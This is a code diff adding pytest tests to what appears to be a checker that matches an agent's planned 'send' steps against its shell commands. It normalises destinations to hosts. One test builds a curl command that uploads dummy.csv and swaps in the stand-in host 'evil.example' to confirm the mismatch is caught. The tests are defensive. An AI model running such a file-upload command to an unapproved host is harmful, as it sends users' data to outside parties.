@@ -228,3 +228,27 @@ def test_steps_text_for_the_inbox():
     )
     assert text == "Steps:\n- write summary.txt\n- send dummy.csv -> httpbin.org (risky)"
     assert steps_text([]) == ""
+
+
+@pytest.mark.parametrize(
+    "given, kept",
+    [
+        ("https://httpbin.org/post", "httpbin.org"),
+        ("http://HTTPBIN.org:8080/x?y=1", "httpbin.org"),
+        ("httpbin.org/post", "httpbin.org"),
+        ("httpbin.org:443", "httpbin.org"),
+        ("httpbin.org", "httpbin.org"),
+        ("slack:T1/C9", "slack:t1/c9"),  # a connector recipient keeps its shape
+        ("ana@example.com", "ana@example.com"),
+    ],
+)
+def test_a_send_destination_is_reduced_to_its_host(given, kept):
+    steps, _ = normalize_steps([{"kind": "send", "target": "dummy.csv", "destination": given}])
+    assert steps[0].destination == kept
+
+
+def test_a_url_destination_matches_the_upload_it_names(tmp_path):
+    steps, _ = normalize_steps([{"kind": "send", "target": "dummy.csv", "destination": "https://httpbin.org/post"}])
+    command = 'curl.exe --fail --silent --show-error -F "file=@dummy.csv" https://httpbin.org/post'
+    assert _m(tmp_path, steps, "run_shell", {"command": command})
+    assert not _m(tmp_path, steps, "run_shell", {"command": command.replace("httpbin.org", "evil.example")})
